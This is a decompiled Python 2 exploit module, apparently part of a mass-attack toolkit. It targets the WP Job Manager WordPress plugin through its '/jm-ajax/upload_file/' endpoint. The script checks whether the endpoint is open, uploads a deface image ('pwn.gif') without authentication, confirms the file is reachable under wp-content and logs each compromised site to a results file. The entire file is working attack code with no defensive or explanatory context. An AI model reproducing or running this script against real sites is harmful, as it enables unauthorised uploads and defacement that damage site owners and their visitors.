# uncompyle6 version 2.11.5
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
# [GCC 9.3.0]
# Embedded file name: Exploits\Wp_Job_Manager.py
import requests
import re
from Exploits import printModule
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'
   }
Jce_Deface_image = 'files/pwn.gif'

def Exploit(site):
    try:
        Exploit = '/jm-ajax/upload_file/'
        CheckVuln = requests.get('http://' + site + Exploit, timeout=5, headers=Headers)
        if '"files":[]' in CheckVuln.content:
            try:
                IndeXfile = {'file[]': open(Jce_Deface_image, 'rb')}
                GoT = requests.post('http://' + site + Exploit, files=IndeXfile, timeout=5, headers=Headers)
                GetIndeXpath = re.findall('"url":"(.*)"', GoT.content)
                IndeXpath = GetIndeXpath[0].split('"')[0].replace('\\/', '/').split('/wp-content')[1]
                UploadedIndEX = site + '/wp-content' + IndeXpath
                Checkindex = requests.get('http://' + UploadedIndEX, timeout=5, headers=Headers)
                if 'GIF89a' in Checkindex.content:
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(UploadedIndEX + '\n')
                    return printModule.returnYes(site, 'N/A', 'WP Job Manager', 'Wordpress')
                return printModule.returnNo(site, 'N/A', 'WP Job Manager', 'Wordpress')
            except:
                return printModule.returnNo(site, 'N/A', 'WP Job Manager', 'Wordpress')

        else:
            return printModule.returnNo(site, 'N/A', 'WP Job Manager', 'Wordpress')
    except:
        return printModule.returnNo(site, 'N/A', 'WP Job Manager', 'Wordpress')